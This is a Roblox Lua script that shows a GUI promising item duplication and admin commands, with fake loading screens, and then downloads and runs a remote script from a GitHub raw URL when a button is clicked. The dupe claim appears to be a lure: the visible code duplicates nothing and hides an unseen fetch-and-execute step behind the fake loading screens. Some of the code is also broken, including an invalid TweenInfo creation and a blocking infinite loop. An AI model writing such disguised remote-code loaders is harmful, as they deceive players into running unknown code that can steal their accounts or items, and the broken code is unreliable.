-- LocalScript in StarterPlayerScripts or StarterGui

-- Create the ScreenGui
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "MyGui"
screenGui.ResetOnSpawn = false
screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")

-- Create the main GUI Frame
local mainFrame = Instance.new("Frame")
mainFrame.Size = UDim2.new(0.5, 0, 0.5, 0)
mainFrame.Position = UDim2.new(0.25, 0, 0.25, 0)
mainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30) -- Dark gray background
mainFrame.BorderSizePixel = 0
mainFrame.Parent = screenGui

-- Function to create RGB lighting effect
local function createRGBLighting(frame)
    local tweenService = game:GetService("TweenService")
    local rgbTween = Instance.new("TweenInfo", frame)
    rgbTween.Time = 2
    rgbTween.RepeatCount = -1
    rgbTween.EasingStyle = Enum.EasingStyle.Linear
    rgbTween.EasingDirection = Enum.EasingDirection.InOut

    while true do
        for i = 0, 255, 5 do
            frame.BackgroundColor3 = Color3.fromRGB(i, 0, 255 - i) -- RGB transition from blue to red
            wait(0.05)
        end
        for i = 0, 255, 5 do
            frame.BackgroundColor3 = Color3.fromRGB(255 - i, i, 0) -- RGB transition from red to green
            wait(0.05)
        end
        for i = 0, 255, 5 do
            frame.BackgroundColor3 = Color3.fromRGB(0, 255 - i, i) -- RGB transition from green to blue
            wait(0.05)
        end
    end
end

-- Create the buttons
local button1 = Instance.new("TextButton")
button1.Size = UDim2.new(0.8, 0, 0.2, 0)
button1.Position = UDim2.new(0.1, 0, 0.2, 0)
button1.Text = "Dupe Now!"
button1.TextColor3 = Color3.fromRGB(255, 255, 255)
button1.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
button1.BorderSizePixel = 0
button1.Parent = mainFrame

local button2 = Instance.new("TextButton")
button2.Size = UDim2.new(0.8, 0, 0.2, 0)
button2.Position = UDim2.new(0.1, 0, 0.6, 0)
button2.Text = "Admin Commands"
button2.TextColor3 = Color3.fromRGB(255, 255, 255)
button2.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
button2.BorderSizePixel = 0
button2.Parent = mainFrame

-- Apply RGB lighting effect to buttons
createRGBLighting(button1)
createRGBLighting(button2)

-- Animation for buttons on hover
local function animateButton(button)
    button.MouseEnter:Connect(function()
        button.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
    end)

    button.MouseLeave:Connect(function()
        button.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
    end)
end

animateButton(button1)
animateButton(button2)

-- Function to create the first loading screen
local function createLoadingScreen1()
    local loadingScreen1 = Instance.new("Frame")
    loadingScreen1.Size = UDim2.new(1, 0, 1, 0) -- Fullscreen
    loadingScreen1.BackgroundColor3 = Color3.fromRGB(0, 0, 0) -- Black background
    loadingScreen1.Parent = screenGui

    -- Create a loading label
    local loadingLabel1 = Instance.new("TextLabel")
    loadingLabel1.Size = UDim2.new(1, 0, 0.1, 0)
    loadingLabel1.Position = UDim2.new(0, 0, 0.45, 0)
    loadingLabel1.Text = "Finding Low Server Please Wait."
    loadingLabel1.TextColor3 = Color3.fromRGB(255, 255, 255)
    loadingLabel1.TextScaled = true
    loadingLabel1.BackgroundTransparency = 1
    loadingLabel1.Parent = loadingScreen1

    -- Create a magnifying glass animation
    local magnifyingGlass = Instance.new("ImageLabel")
    magnifyingGlass.Size = UDim2.new(0.1, 0, 0.1, 0)
    magnifyingGlass.Position = UDim2.new(0.5, -50, 0.5, -50)
    magnifyingGlass.Image = "rbxassetid://123456789" -- Replace with your magnifying glass image ID
    magnifyingGlass.BackgroundTransparency = 1
    magnifyingGlass.Parent = loadingScreen1

    -- Animate the magnifying glass
    for i = 1, 40 do
        magnifyingGlass.Position = UDim2.new(0.5 + math.sin(i) * 0.1, -50, 0.5, -50)
        wait(1) -- Wait for 1 second for each frame of the animation
    end

    loadingScreen1:Destroy() -- Remove loading screen after animation
end

-- Function to create the second loading screen
local function createLoadingScreen2()
    local loadingScreen2 = Instance.new("Frame")
    loadingScreen2.Size = UDim2.new(1, 0, 1, 0) -- Fullscreen
    loadingScreen2.BackgroundColor3 = Color3.fromRGB(0, 0, 0) -- Black background
    loadingScreen2.Parent = screenGui

    -- Create a loading label
    local loadingLabel2 = Instance.new("TextLabel")
    loadingLabel2.Size = UDim2.new(1, 0, 0.1, 0)
    loadingLabel2.Position = UDim2.new(0, 0, 0.45, 0)
    loadingLabel2.Text = "Rejoining Server Please Do Not Close Roblox!"
    loadingLabel2.TextColor3 = Color3.fromRGB(255, 255, 255)
    loadingLabel2.TextScaled = true
    loadingLabel2.BackgroundTransparency = 1
    loadingLabel2.Parent = loadingScreen2

    -- Create a loading animation
    local loadingCircle = Instance.new("Frame")
    loadingCircle.Size = UDim2.new(0.1, 0, 0.1, 0)
    loadingCircle.Position = UDim2.new(0.5, -50, 0.5, -50)
    loadingCircle.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    loadingCircle.Parent = loadingScreen2

    -- Animate the loading circle with RGB effect
    for i = 1, 40 do
        loadingCircle.Rotation = loadingCircle.Rotation + 9 -- Rotate 9 degrees each frame
        loadingCircle.BackgroundColor3 = Color3.fromRGB(math.random(0, 255), math.random(0, 255), math.random(0, 255)) -- Random RGB color
        wait(1) -- Wait for 1 second for each frame of the animation
    end

    loadingScreen2:Destroy() -- Remove loading screen after animation
end

-- Button click event
local function onButtonClick(button)
    button.MouseButton1Click:Connect(function()
        -- Smooth animation for button click
        button:TweenSize(UDim2.new(0, 0, 0, 0), Enum.EasingDirection.Out, Enum.EasingStyle.Quad, 0.5, true, function()
            button:Destroy() -- Remove the button after animation
        end)

        -- Create the first loading screen
        createLoadingScreen1()

        -- Create the second loading screen
        createLoadingScreen2()

        -- Load the external script
        local success, err = pcall(function()
            loadstring(game:HttpGet("https://raw.githubusercontent.com/lowznt/growagarden/refs/heads/main/growagarden.lua"))()
        end)

        if not success then
            warn("Failed to execute script: " .. err)
        end
    end)
end

-- Connect button click events
onButtonClick(button1)
onButtonClick(button2)
